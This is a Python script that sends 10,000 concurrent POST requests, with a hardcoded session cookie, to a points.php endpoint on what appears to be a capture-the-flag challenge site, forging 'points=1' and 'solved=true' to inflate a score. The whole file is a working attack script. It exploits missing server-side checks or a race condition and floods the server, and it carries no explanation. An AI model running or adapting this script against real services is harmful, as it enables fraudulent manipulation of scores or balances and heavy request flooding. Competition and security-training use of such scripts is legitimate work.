import asyncio
import requests

COOKIES = { 'PHPSESSID': 'c449355347e9f8084a8d9c22915dd943' }
DATA = {'points' : '1', 'solved' : 'true'}
HEADERS = {
    'Connection': 'keep-alive',
    'Accept': '*/*',
    'Sec-Fetch-Dest': 'empty',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36',
    'DNT': '1',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://xtrader.fireshellsecurity.team',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Referer': 'https://xtrader.fireshellsecurity.team/',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6',
}

def fetch():
   requests.post('https://xtrader.fireshellsecurity.team/points.php', headers=HEADERS, cookies=COOKIES, data=DATA)

async def main():
    loop = asyncio.get_event_loop()
    futures = [
        loop.run_in_executor(
            None, 
            fetch
        )
        for i in range(10000)
    ]
    for response in await asyncio.gather(* futures):
        pass

loop = asyncio.get_event_loop()
loop.run_until_complete(main())


    